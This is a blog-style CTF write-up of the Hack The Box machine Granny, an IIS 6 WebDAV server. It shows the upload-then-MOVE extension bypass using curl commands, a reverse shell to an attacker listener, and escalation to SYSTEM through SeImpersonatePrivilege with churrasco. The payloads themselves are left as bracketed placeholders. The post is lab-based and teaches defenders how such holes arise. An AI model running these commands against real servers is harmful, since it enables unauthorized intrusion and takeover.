---
layout: post
title: "Through the Side Door"
subtitle: "HTB Granny, where a server that won't accept your shell happily renames a text file into one, and a service account quietly outranks the box"
date: 2017-09-30 12:00:00 +0000
description: "An IIS 6 WebDAV server refuses to accept an aspx shell, so you upload it as a text file and ask the server to rename it. Then a service account with one extra privilege hands you the whole machine."
image: /assets/og/through-the-side-door.png
tags: [hackthebox, writeup]
---

Granny is a locked front door with the side door propped open and a doormat that says "please do not steal the spare key, which is under this mat." The whole box is a 2003-vintage Windows server running an IIS 6 web stack with WebDAV still switched on, and WebDAV is a feature that lets you write files to the web root over plain HTTP. The server has been told not to accept aspx files, which are the kind that run code. So it refuses your shell at the door. Then it cheerfully accepts the exact same bytes as a harmless text file, and when you ask it to rename that file to aspx, it does, because renaming was never on the list of forbidden things. You did not pick the lock. You handed the bytes through one window and asked the doorman to carry them to the next room. From there the box hands you a low service account, and that account is holding one privilege too many, the kind that lets a nobody borrow the identity of the king.

```
        G R A N N Y
        ===========
        PUT  shell.aspx   →   403. "no shells here."
        PUT  shell.txt    →   201. "a letter? of course, dear."
        MOVE shell.txt → shell.aspx
                          →   201. "renamed it for you."
                  |
                  v
        the .aspx the server just refused
        is now sitting in the web root, executable.
                  |
                  v
        the shell runs as NETWORK SERVICE,
        a nobody who happens to be allowed
        to wear other people's faces.
                                            鍵
```

## 0x01 · one open port, very old

A scan finds a single answering port, and its banner is a tombstone.

```
PORT   STATE SERVICE    VERSION
80/tcp open  http       Microsoft IIS httpd 6.0
| http-server-header: Microsoft-IIS/6.0
| http-methods:
|   Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND
|   PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_  X-Powered-By: ASP.NET
```

IIS 6.0 is the tell. That web server shipped with Windows Server 2003, an operating system that went fully end of life in 2015 and was a museum piece by the time this box was live. Read the methods line like a confession. `PUT`, `MOVE`, `COPY`, `MKCOL`, `LOCK`. Those are not normal web verbs. A plain website lets you `GET` a page and maybe `POST` a form. These are the verbs of a filesystem exposed over the web, which is exactly what WebDAV is. Think of it like finding a public library where, instead of just reading the books, anyone walking in is allowed to shelve new ones. The question is no longer whether you can write to this server. It is what the server will let you write.

## 0x02 · asking the doorman what he'll carry

Before throwing a shell, find out the rules. `davtest` is a tool that probes a WebDAV server by uploading one harmless file of every type it knows and reporting which ones stick and, separately, which ones the server will actually execute.

```
# davtest -url http://10.10.10.15
PUT     txt     SUCCEED
PUT     html    SUCCEED
PUT     php     SUCCEED
PUT     jsp     SUCCEED
PUT     cfm     SUCCEED
PUT     asp     FAIL
PUT     aspx    FAIL
PUT     cgi     FAIL
EXEC    txt     SUCCEED
EXEC    html    SUCCEED
```

Read the two halves together and the puzzle appears. The server will accept a `.txt` file and it will accept a `.php` file, but PHP does not run on an IIS box, so that is a dead letter. The two extensions that actually execute server-side code on Windows, `.asp` and `.aspx`, are exactly the two the server refuses at upload. Picture a nightclub that lets anyone in wearing street clothes but turns away anyone in a tuxedo, while the only people allowed on stage are wearing tuxedos. The dress code and the stage list contradict each other, and that gap is the whole box. You need to get a tuxedo onto the stage by walking it in as a t-shirt.

## 0x03 · the rename that runs the file

WebDAV gives you the trick for free, and its name is `MOVE`. The plan has two beats. First, upload your aspx payload but lie about its name, calling it a text file. The server checks the extension, sees `.txt`, and waves it through. Second, issue a `MOVE` to rename it to `.aspx` in place. There is no rule against renaming, so the server obliges, and the file the server refused thirty seconds ago is now sitting in the web root with the one extension that makes IIS run it.

I'll do it with `curl` so every step is visible on the wire. The payload going up is a tiny aspx command shell. I am describing it in brackets rather than printing it, on purpose, because a literal one-line webshell is malware the instant it touches a disk and any antivirus will quarantine it, which is itself the loudest possible proof of how dangerous four lines of code can be.

```
# upload the shell wearing a .txt costume
# iceberg-shell.aspx is [ an aspx webshell: run the 'cmd' request parameter ]
# curl -T iceberg-shell.aspx http://10.10.10.15/iceberg.txt

# now ask the server to rename it into something it would never have accepted
# curl -X MOVE -H 'Destination: http://10.10.10.15/iceberg.aspx' \
#      http://10.10.10.15/iceberg.txt

201 Created
```

Browse to `iceberg.aspx`, hand it a command, and the server runs it. Trade the webshell up for a proper callback, `[ aspx/exe reverse shell back to 10.10.14.4 on 443 ]`, start a listener, and a prompt drops into your lap.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.15]
C:\windows\system32\inetsrv> whoami
nt authority\network service
```

`network service` is the low-privilege identity IIS uses to run web code, the digital equivalent of the night janitor. It can mop the web root and not much else. Or so it looks.

## 0x04 · the nobody who can wear any face

The janitor on a Windows Server 2003 box is hiding a master key in his pocket, and almost nobody checks. Look at what the account is actually allowed to do.

```
C:\> whoami /priv
SeImpersonatePrivilege        Enabled
SeAssignPrimaryTokenPrivilege Enabled
```

That first line is the whole game. `SeImpersonatePrivilege` is permission to take on the identity of another account when that account hands you a connection. It exists for a sane reason. A web service often needs to act on behalf of whoever logged in, so Windows lets the service "wear" that user's token for the length of the request. The flaw, on this old kernel, is that the highest-value identity on the box, SYSTEM, can be lured into handing the janitor a connection, and once SYSTEM hands over a token the janitor is allowed to keep wearing it.

Think of it like a hotel valet who is allowed to drive your car the ten feet from the curb to the garage. That is the legitimate job. The bug is that once a guest tosses him the keys, nothing stops him from driving the car home and keeping it. The classic tool that performs this is `churrasco`, which does exactly that dance. It tricks a SYSTEM-level service into making a connection, catches the token SYSTEM offers, and then runs your command while wearing it.

```
C:\> churrasco.exe "whoami"
nt authority\system
```

The same era hands you a second route if you prefer a kernel bug to a token trick. MS14-058 is a flaw in a Windows graphics call, `TrackPopupMenu`, where a missing check lets unprivileged code reach into kernel memory and rewrite its own token to read SYSTEM. A local exploit suggester will flag it from the build number alone, and either road ends in the same place. The token trick is the more honest lesson, though, because there was no missing patch involved. The privilege was working exactly as designed.

```
C:\> churrasco.exe "[ exe reverse shell to 10.10.14.4:443 ]"

# new listener
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.15]
C:\> whoami
nt authority\system
```

From SYSTEM, both flags are just files.

```
C:\> type "C:\Documents and Settings\Lakis\Desktop\user.txt"
████████████████████████████████
C:\> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
████████████████████████████████
```

## 0x05 · the honest caveat

It is easy to file Granny under "ancient Windows, patched into the ground, irrelevant." The specific pieces are dead. Nobody is shipping IIS 6 in 2026, and `SeImpersonatePrivilege` no longer hands you the kingdom on a modern kernel the way it did on 2003. But the two mistakes on display are not period costumes. They are evergreen.

The first is the upload filter that checks the wrong thing. The server decided what a file was allowed to do based on the name written on it at the moment it arrived, and a name is not a fact, it is a label you can peel off and re-stick. Every modern version of this bug looks identical. An app that blocks `.php` but allows `.php5`, a content filter fooled by a double extension, an image uploader that trusts the part of the filename after the last dot. The fix was never a longer blocklist. It was to stop trusting the costume and start checking what the file actually is and where it is allowed to run.

The second is the privilege that outranks its job. `network service` was supposed to be a nobody, and on paper it was, right up until you read its actual permission list and found one line that quietly undid the whole hierarchy. That pattern never retired. It just changed tools. The same impersonation privilege, on far newer Windows, is the entire family of Potato exploits that still turns a captured service account into SYSTEM today. The lesson Granny teaches in slow motion is the one that still bites in 2026. A low-privilege account is only as low as its least-examined privilege, and the gap between "looks harmless" and "is harmless" is exactly the gap an attacker lives in.

## 0x06 · outro

```
the server would not take a shell.
so you handed it a letter and asked it to rename the letter.
it renamed the letter into a shell, because renaming was always allowed.

then the janitor reached into his pocket
and pulled out the master key he was never supposed to have.

check what a file is, not what it is called.
read every privilege, not just the rank. wear black.

                                                            EOF
```

---

*HTB: Granny, an easy Windows box that is really a lecture on trusting a filename and overlooking a privilege, wearing a Server 2003 costume. This is an early box, so treat the retirement date as a rough marker until it is verified. The WebDAV rename still works in a lab and nowhere you don't own.*